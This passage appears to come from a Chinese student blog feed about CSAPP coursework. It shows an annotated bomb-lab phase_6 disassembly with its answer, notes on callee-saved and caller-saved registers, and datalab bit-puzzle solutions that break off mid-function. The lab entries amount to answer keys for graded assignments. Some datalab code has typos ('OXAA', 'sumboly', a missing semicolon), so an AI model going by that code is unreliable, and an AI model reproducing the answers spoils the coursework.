class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004010f</span>4 &lt;phase_6&gt;:<br>  <span class="hljs-number">4010f</span>4:<span class="hljs-number">41</span> <span class="hljs-number">56</span>                push   %r14<br>  <span class="hljs-number">4010f</span>6:<span class="hljs-number">41</span> <span class="hljs-number">55</span>                push   %r13<br>  <span class="hljs-number">4010f</span>8:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r12<br>  <span class="hljs-number">4010f</span>a:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">4010f</span>b:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">4010f</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">50</span>          sub    $<span class="hljs-number">0x50</span>,%rsp<span class="hljs-comment">//开辟空间，挺大的</span><br>  <span class="hljs-number">401100</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e5             mov    %rsp,%r13<br>  <span class="hljs-number">401103</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi<br>  <span class="hljs-number">401106</span>:e8 <span class="hljs-number">51</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;<span class="hljs-comment">//读6个数进来</span><br>  <span class="hljs-number">40110b</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e6             mov    %rsp,%r14<br>  <span class="hljs-number">40110</span>e:<span class="hljs-number">41</span> bc <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    mov    $<span class="hljs-number">0x0</span>,%r12d<br>  <span class="hljs-number">401114</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> ed             mov    %r13,%rbp<span class="hljs-comment">//目前有很多寄存器指向栈顶</span><br>  <span class="hljs-number">401117</span>:<span class="hljs-number">41</span> <span class="hljs-number">8b</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>          mov    <span class="hljs-number">0x0</span>(%r13),%eax<span class="hljs-comment">//%eax目前是6个数的第一个数的位置</span><br>  <span class="hljs-number">40111b</span>:<span class="hljs-number">83</span> e8 <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%eax<br>  <span class="hljs-number">40111</span>e:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax<br>  <span class="hljs-number">401121</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">401128</span> &lt;phase_6+<span class="hljs-number">0x34</span>&gt;<span class="hljs-comment">//每个数必须小于等于6</span><br>  <span class="hljs-number">401123</span>:e8 <span class="hljs-number">12</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401128</span>:<span class="hljs-number">41</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%r12d<br>  <span class="hljs-number">40112</span>c:<span class="hljs-number">41</span> <span class="hljs-number">83</span> fc <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%r12d<br>  <span class="hljs-number">401130</span>:<span class="hljs-number">74</span> <span class="hljs-number">21</span>                je     <span class="hljs-number">401153</span> &lt;phase_6+<span class="hljs-number">0x5f</span>&gt;<br>  <span class="hljs-number">401132</span>:<span class="hljs-number">44</span> <span class="hljs-number">89</span> e3             mov    %r12d,%ebx<br>  <span class="hljs-number">401135</span>:<span class="hljs-number">48</span> <span class="hljs-number">63</span> c3             movslq %ebx,%rax<br>  <span class="hljs-number">401138</span>:<span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">84</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rax,<span class="hljs-number">4</span>),%eax<br>  <span class="hljs-number">40113b</span>:<span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    %eax,<span class="hljs-number">0x0</span>(%rbp)<br>  <span class="hljs-number">40113</span>e:<span class="hljs-number">75</span> <span class="hljs-number">05</span>                jne    <span class="hljs-number">401145</span> &lt;phase_6+<span class="hljs-number">0x51</span>&gt;<span class="hljs-comment">//每个数互相都不相等，</span><br>  <span class="hljs-number">401140</span>:e8 f5 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401145</span>:<span class="hljs-number">83</span> c3 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%ebx<br>  <span class="hljs-number">401148</span>:<span class="hljs-number">83</span> fb <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%ebx <br>  <span class="hljs-number">40114b</span>:<span class="hljs-number">7</span>e e8                jle    <span class="hljs-number">401135</span> &lt;phase_6+<span class="hljs-number">0x41</span>&gt;<br>  <span class="hljs-number">40114</span>d:<span class="hljs-number">49</span> <span class="hljs-number">83</span> c5 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%r13<br>  <span class="hljs-number">401151</span>:eb c1                jmp    <span class="hljs-number">401114</span> &lt;phase_6+<span class="hljs-number">0x20</span>&gt;<span class="hljs-comment">//一个大循环</span><br>  <br>  <span class="hljs-number">401153</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rsi<br>  <span class="hljs-number">401158</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> f0             mov    %r14,%rax<br>  <span class="hljs-number">40115b</span>:b9 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x7</span>,%ecx<br>  <span class="hljs-number">401160</span>:<span class="hljs-number">89</span> ca                mov    %ecx,%edx<br>  <span class="hljs-number">401162</span>:<span class="hljs-number">2b</span> <span class="hljs-number">10</span>                <span class="hljs-built_in">sub</span>    (%rax),%edx<br>  <span class="hljs-number">401164</span>:<span class="hljs-number">89</span> <span class="hljs-number">10</span>                mov    %edx,(%rax)<br>  <span class="hljs-number">401166</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rax<br>  <span class="hljs-number">40116</span>a:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax<br>  <span class="hljs-number">40116</span>d:<span class="hljs-number">75</span> f1                jne    <span class="hljs-number">401160</span> &lt;phase_6+<span class="hljs-number">0x6c</span>&gt;<span class="hljs-comment">//这段就是把每个数被7减，然后再放回去</span><br>  <br>  <span class="hljs-number">40116f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi<br>  <span class="hljs-number">401174</span>:eb <span class="hljs-number">21</span>                jmp    <span class="hljs-number">401197</span> &lt;phase_6+<span class="hljs-number">0xa3</span>&gt;<br>  <span class="hljs-number">401176</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">52</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rdx),%rdx<br>  <span class="hljs-number">40117</span>a:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%eax<br>  <span class="hljs-number">40117</span>d:<span class="hljs-number">39</span> c8                cmp    %ecx,%eax<br>  <span class="hljs-number">40117f</span>:<span class="hljs-number">75</span> f5                jne    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt;<br>  <span class="hljs-number">401181</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">401188</span> &lt;phase_6+<span class="hljs-number">0x94</span>&gt;<br>  <br>  <span class="hljs-number">401183</span>:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx<span class="hljs-comment">//查看这个位置的值</span><br>  <span class="hljs-number">401188</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">54</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span>       mov    %rdx,<span class="hljs-number">0x20</span>(%rsp,%rsi,<span class="hljs-number">2</span>)<br>  <span class="hljs-number">40118</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c6 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rsi<br>  <span class="hljs-number">401191</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> fe <span class="hljs-number">18</span>          cmp    $<span class="hljs-number">0x18</span>,%rsi<br>  <span class="hljs-number">401195</span>:<span class="hljs-number">74</span> <span class="hljs-number">14</span>                je     <span class="hljs-number">4011</span>ab &lt;phase_6+<span class="hljs-number">0xb7</span>&gt;<br>  <br>  <span class="hljs-number">401197</span>:<span class="hljs-number">8b</span> <span class="hljs-number">0</span>c <span class="hljs-number">34</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rsi,<span class="hljs-number">1</span>),%ecx<br>  <span class="hljs-number">40119</span>a:<span class="hljs-number">83</span> f9 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%ecx<br>  <span class="hljs-number">40119</span>d:<span class="hljs-number">7</span>e e4                jle    <span class="hljs-number">401183</span> &lt;phase_6+<span class="hljs-number">0x8f</span>&gt;<br>  <br>  <span class="hljs-number">40119f</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%eax<br>  <span class="hljs-number">4011</span>a4:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx<br>  <span class="hljs-number">4011</span>a9:eb cb                jmp    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt;<span class="hljs-comment">//给每个结点设定值</span><br>  <br>  <span class="hljs-number">4011</span>ab:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">20</span>       mov    <span class="hljs-number">0x20</span>(%rsp),%rbx<br>  <span class="hljs-number">4011b</span>0:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">28</span>       lea    <span class="hljs-number">0x28</span>(%rsp),%rax<br>  <span class="hljs-number">4011b</span>5:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">50</span>       lea    <span class="hljs-number">0x50</span>(%rsp),%rsi<br>  <span class="hljs-number">4011b</span>a:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d9             mov    %rbx,%rcx<br>  <span class="hljs-number">4011b</span>d:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">10</span>             <span class="hljs-built_in">mov</span>    (%rax),%rdx<br>  <span class="hljs-number">4011</span>c0:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">51</span> <span class="hljs-number">08</span>          mov    %rdx,<span class="hljs-number">0x8</span>(%rcx)<br>  <span class="hljs-number">4011</span>c4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rax<br>  <span class="hljs-number">4011</span>c8:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax<br>  <span class="hljs-number">4011</span>cb:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4011</span>d2 &lt;phase_6+<span class="hljs-number">0xde</span>&gt;<br>  <span class="hljs-number">4011</span>cd:<span class="hljs-number">48</span> <span class="hljs-number">89</span> d1             mov    %rdx,%rcx<br>  <span class="hljs-number">4011</span>d0:eb eb                jmp    <span class="hljs-number">4011b</span>d &lt;phase_6+<span class="hljs-number">0xc9</span>&gt;<br>  <span class="hljs-number">4011</span>d2:<span class="hljs-number">48</span> c7 <span class="hljs-number">42</span> <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movq   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x8</span>(%rdx)<span class="hljs-comment">//循环遍历，调整各自的next值</span><br>  <span class="hljs-number">4011</span>d9:<span class="hljs-number">00</span> <br>  <br>  <span class="hljs-number">4011</span>da:bd <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x5</span>,%ebp<br>  <span class="hljs-number">4011</span>df:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">43</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rax<br>  <span class="hljs-number">4011e3</span>:<span class="hljs-number">8b</span> <span class="hljs-number">00</span>                <span class="hljs-built_in">mov</span>    (%rax),%eax<br>  <span class="hljs-number">4011e5</span>:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx)<br>  <span class="hljs-number">4011e7</span>:<span class="hljs-number">7</span>d <span class="hljs-number">05</span>                jge    <span class="hljs-number">4011</span>ee &lt;phase_6+<span class="hljs-number">0xfa</span>&gt;<br>  <span class="hljs-number">4011e9</span>:e8 <span class="hljs-number">4</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<span class="hljs-comment">//后面一个结点的值必须比前面的小</span><br>  <span class="hljs-number">4011</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">5b</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rbx),%rbx<br>  <span class="hljs-number">4011f</span>2:<span class="hljs-number">83</span> ed <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%ebp<br>  <span class="hljs-number">4011f</span>5:<span class="hljs-number">75</span> e8                jne    <span class="hljs-number">4011</span>df &lt;phase_6+<span class="hljs-number">0xeb</span>&gt;<br>  <span class="hljs-number">4011f</span>7:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">50</span>          add    $<span class="hljs-number">0x50</span>,%rsp<br>  <span class="hljs-number">4011f</span>b:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4011f</span>c:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">4011f</span>d:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r12<br>  <span class="hljs-number">4011f</span>f:<span class="hljs-number">41</span> <span class="hljs-number">5</span>d                pop    %r13<br>  <span class="hljs-number">401201</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>e                pop    %r14<br>  <span class="hljs-number">401203</span>:c3                   retq   <br></code></pre></td></tr></table></figure><p>好，最后一个了，查看<code>0x6032d0</code>向后24个字节的内容，发现是6个结点，每个结点的值都不一样。<br><img src="/images/lab26.png"></p><p>按照值排列是 3 4 5 6 1 2 ，被7减过应该是4 3 2 1 6 5</p><p>结束！最后这个真的难，感觉还不是很懂。还得再看看~</p>]]></content>
    
    
    <categories>
      
      <category>lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP</title>
    <link href="/2021/08/12/csapp/"/>
    <url>/2021/08/12/csapp/</url>
    
    <content type="html"><![CDATA[<h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><p>16个通用寄存器<br><img src="/images/res.png"></p><p>在了解寄存器概念之前，需要了解两个概念：调用者保存 / 被调用者保存</p><p>比如说：函数A调用了函数B，在调用函数B的时候某些寄存器的值被修改了，但是逻辑上在函数B调用结束之后这些寄存器的值应该和调用之前一致。 解决这个问题有两个策略</p><ul><li><p>函数A在调用函数B之前，提前保存函数B中寄存器的内容，在执行完函数B之后再恢复，这种策略被称为调用者保存</p></li><li><p>函数B在执行之前，自己先保存将要被修改的寄存器的内容，在函数B返回之前，再恢复，这种策略被成为被调用者保存</p></li></ul><p>不同的寄存器被定义成不同的策略。</p><p>被调用者保存寄存器（Call saved）：<code>%rbx</code>,<code>%rbp</code>,<code>%r12</code>,<code>%r13</code>,<code>%r14</code>,<code>%r15</code></p><p>调用者保存寄存器（Caller saved）：<code>%r10</code>,<code>%r11</code>,<code>%rax</code>,<code>%rdi</code>,<code>%rsi</code>,<code>%rdx</code>,<code>%rcx</code>,<code>%r8</code>,<code>%r9</code></p><p><img src="/images/res1.png"><br><img src="/images/res2.png"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>csapp lab1</title>
    <link href="/2021/08/12/lab1_datalab/"/>
    <url>/2021/08/12/lab1_datalab/</url>
    
    <content type="html"><![CDATA[<h5 id="1-比特异或"><a href="#1-比特异或" class="headerlink" title="1:比特异或"></a>1:比特异或</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> ~(~(x &amp; ~y) &amp; ~(~x &amp; y));<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-补码最小值"><a href="#2-补码最小值" class="headerlink" title="2:补码最小值"></a>2:补码最小值</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0x1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3-是否为补码最大值"><a href="#3-是否为补码最大值" class="headerlink" title="3:是否为补码最大值"></a>3:是否为补码最大值</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> !(~(x + <span class="hljs-number">1</span>) ^ x) &amp; !!(x + <span class="hljs-number">1</span>)<span class="hljs-comment">//和!!(x + 1)相与是防止1111这种情况出现，</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="奇数位置是否为1"><a href="#奇数位置是否为1" class="headerlink" title="奇数位置是否为1"></a>奇数位置是否为1</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">0XAA</span> &lt;&lt; <span class="hljs-number">8</span>;<br>  <span class="hljs-type">int</span> c = a | OXAA;<br>  <span class="hljs-type">int</span> d = c &lt;&lt; <span class="hljs-number">16</span> | c;<br>  <span class="hljs-keyword">return</span> !((x &amp; d) ^ d);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="返回负数"><a href="#返回负数" class="headerlink" title="返回负数"></a>返回负数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> ~x + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="判断范围"><a href="#判断范围" class="headerlink" title="判断范围"></a>判断范围</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-type">int</span> min = <span class="hljs-number">0X2f</span> + (~x + <span class="hljs-number">1</span>);<br>  <span class="hljs-type">int</span> max = <span class="hljs-number">0x39</span> + (~x + <span class="hljs-number">1</span>);<br>  min = (min &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  max = !(max &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> min &amp; max;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> </span>&#123;<br>  x = !!x;<br>  x = ~x + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> (x &amp; y) | (~x &amp; z);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="小于等于"><a href="#小于等于" class="headerlink" title="小于等于"></a>小于等于</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>  <span class="hljs-type">int</span> symbolx = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">0x1</span>;<br>  <span class="hljs-type">int</span> symboly = y &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">0x1</span>;<br>  <span class="hljs-type">int</span> symboldiff = symbolx &amp; (!sumboly);<span class="hljs-comment">//先比较符号位</span><br>  <span class="hljs-type">int</span> symbolsame = (!(symbolx ^ symboly)) &amp; (!((~x + <span class="hljs-number">1</span> + y) &gt;&gt; <span class="hljs-number">31</span>));<br>  <span class="hljs-keyword">return</span> symboldiff | symbolsame;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> * 